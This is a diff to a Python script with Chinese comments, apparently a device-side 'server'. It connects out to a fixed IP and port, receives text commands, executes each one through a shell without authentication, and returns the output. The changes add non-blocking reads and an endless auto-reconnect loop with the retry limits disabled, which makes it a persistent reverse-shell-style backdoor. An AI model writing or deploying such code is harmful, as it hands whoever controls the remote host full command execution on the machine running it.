@@ -4,6 +4,7 @@ import threading
 import requests
 import hashlib
 import time
+import select
 from constants import SALT, API_URL
 from tools import log_with_timestamp
 
@@ -29,8 +30,6 @@ def send_syn_message(client_socket):
     client_socket.send(syn_message.encode('utf-8'))
     log_with_timestamp(f"已发送 SYN 消息:\n{syn_message}")
 
-
-# 处理客户端命令请求
 def handle_client(client_socket):
     try:
         # 先发送 SYN 消息
@@ -42,69 +41,81 @@ def handle_client(client_socket):
 
         # 进入命令交互阶段
         while True:
-            # 接收客户端发送的命令
-            command = client_socket.recv(1024).decode('utf-8')
-            log_with_timestamp(f"接收到命令: {command}")
+            # 使用 select 进行非阻塞读取
+            ready_to_read, _, _ = select.select([client_socket], [], [], 5)  # 5秒超时
 
-            # 执行命令并返回结果
-            result = subprocess.run(command, shell=True, capture_output=True, text=True)
-            response = result.stdout + "\n" + result.stderr
+            if ready_to_read:
+                # 接收客户端发送的命令
+                command = client_socket.recv(1024).decode('utf-8')
+                log_with_timestamp(f"接收到命令: {command}")
 
-            # 发送结果回客户端
-            client_socket.send(response.encode('utf-8'))
+                if not command:
+                    # 客户端关闭连接的情况
+                    log_with_timestamp("客户端关闭了连接")
+                    break
+
+                # 执行命令并返回结果
+                result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                response = result.stdout + "\n" + result.stderr
+
+                # 发送结果回客户端
+                client_socket.send(response.encode('utf-8'))
+            else:
+                # 如果没有数据可读，继续等待
+                log_with_timestamp("没有接收到命令，继续等待...")
+                continue  # 等待下一次
+
     except Exception as e:
+        log_with_timestamp(f"处理客户端时发生错误: {str(e)}")
         client_socket.send(f"Error: {str(e)}".encode('utf-8'))
+        raise e  # 重新抛出异常以便重试
     finally:
         client_socket.close()
 
 
-# 服务器交互
-def start_server(host='0.0.0.0', port=9999, client_ip='10.128.51.10', max_syn_retries=5, syn_timeout=5):
-    """
-    启动服务器并向指定客户端 IP 地址发送 SYN 消息。直到接收到 ACK 才建立连接。
-    """
-    # 服务器套接字初始化
+# 启动服务器
+def start_server(host='0.0.0.0', port=9999, client_ip='10.128.51.10', max_syn_retries=5, syn_timeout=3):
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind((host, port))
-    server_socket.listen(1)  # 监听最多一个连接
+    server_socket.listen(1)
     log_with_timestamp(f"服务端已启动，监听 {host}:{port}...")
-
-    # 直接连接指定的客户端 IP 地址
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     retries = 0
     while True:
         try:
             log_with_timestamp(f"等待客户端连接...")
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client_socket.connect((client_ip, port))
 
-            # 发送 SYN 消息并等待 ACK
-            send_syn_message(client_socket)
-
-            # 设置超时等待 ACK
+            # 设置超时时间和重试次数
             client_socket.settimeout(syn_timeout)
-            ack_message = client_socket.recv(1024).decode('utf-8')
 
-            # 如果接收到 ACK，表示建立连接
-            log_with_timestamp(f"接收到 ACK 消息: {ack_message}")
-            break
+            # 处理客户端交互
+            client_handler = threading.Thread(target=handle_client, args=(client_socket,))
+            client_handler.start()
+            client_handler.join()  # 等待线程结束
+
         except socket.timeout:
             retries += 1
-            log_with_timestamp(f"超时未收到 ACK，重新发送 SYN 消息 (尝试 {retries}/{max_syn_retries})...")
+            log_with_timestamp(f"超时未收到 ACK，重新尝试连接 ({retries}/{max_syn_retries})...")
             # if retries >= max_syn_retries:
-            #     log_with_timestamp("超过最大重试次数，无法建立连接。")
-            #     return  # 如果超过最大重试次数则退出
+            #     log_with_timestamp("超过最大重试次数，无法建立连接。退出程序。")
+            #     break
         except Exception as e:
-            log_with_timestamp(f"连接失败: {str(e)}")
+            log_with_timestamp(f"连接或交互失败: {str(e)}。正在重新建立连接...")
+        finally:
+            # 确保关闭旧的连接套接字
+            try:
+                client_socket.close()
+            except Exception:
+                pass
+
             retries += 1
             # if retries >= max_syn_retries:
-            #     log_with_timestamp("超过最大重试次数，无法建立连接。")
-            #     return  # 如果超过最大重试次数则退出
+            #     log_with_timestamp("超过最大重试次数，无法建立连接。退出程序。")
+            #     break
 
-    # 如果成功建立连接，则处理客户端命令
-    client_handler = threading.Thread(target=handle_client, args=(client_socket,))
-    client_handler.start()
-
+            time.sleep(2)  # 短暂等待后重试连接
 
 # 推送数据函数
 def push_data(payload: dict, max_retry: int, retry_interval: int):
@@ -139,3 +150,4 @@ def push_data(payload: dict, max_retry: int, retry_interval: int):
 
     if not success:
         log_with_timestamp("\033[91m推送失败，达到最大重传次数。\033[0m")
+
